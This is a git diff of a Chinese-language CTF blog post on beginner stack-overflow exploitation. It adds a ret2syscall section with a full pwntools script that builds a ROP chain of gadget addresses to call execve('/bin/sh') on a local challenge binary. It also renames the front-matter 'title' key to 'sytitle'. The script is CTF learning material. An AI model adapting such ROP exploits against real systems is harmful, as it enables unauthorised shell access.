@@ -1,5 +1,5 @@
 ---
-title: Pwn入门 - Part III Stack Overflow实战(CTFWIKI)
+sytitle: Pwn入门 - Part III Stack Overflow实战(CTFWIKI)
 date: 2022-1-9 14:09:00 +0800
 author: sirius
 categories: [CTF]
@@ -65,6 +65,8 @@ r.interactive()
 
 ### # ret2shellcode
 
+![image-20220123221740937](/assets/img/2022/image-20220123221740937.png)
+
 ```python
 from pwn import *
 
@@ -80,7 +82,41 @@ r.sendline(p)
 r.interactive()
 ```
 
+### ret2syscall
 
+![image-20220123220116190](/assets/img/2022/image-20220123220116190.png)
+
+查找`/bin/sh`的正确姿势
+
+![image-20220123220910645](/assets/img/2022/image-20220123220910645.png){: .normal}
+
+![image-20220123221254741](/assets/img/2022/image-20220123221254741.png)
+
+```python
+from pwn import *
+
+
+r = process('./rop')
+
+r.recvuntil('plan to do?\n')
+
+pop_eax = 0x080bb196 # pop eax ; ret
+pop_edx_ecx_ebx = 0x0806eb90 # pop edx ; pop ecx ; pop ebx ; ret
+int_0x80 = 0x08049421 # int 0x80
+sh = 0x080be408 # /bin/sh
+
+p = 'a'*(0x6c+0x4)
+p += p32(pop_edx_ecx_ebx)
+p += p32(0)
+p += p32(0)
+p += p32(sh)
+p += p32(pop_eax)
+p += p32(0xb)
+p += p32(int_0x80)
+
+r.sendline(p)
+r.interactive()
+```
 
 ## 中级ROP
 
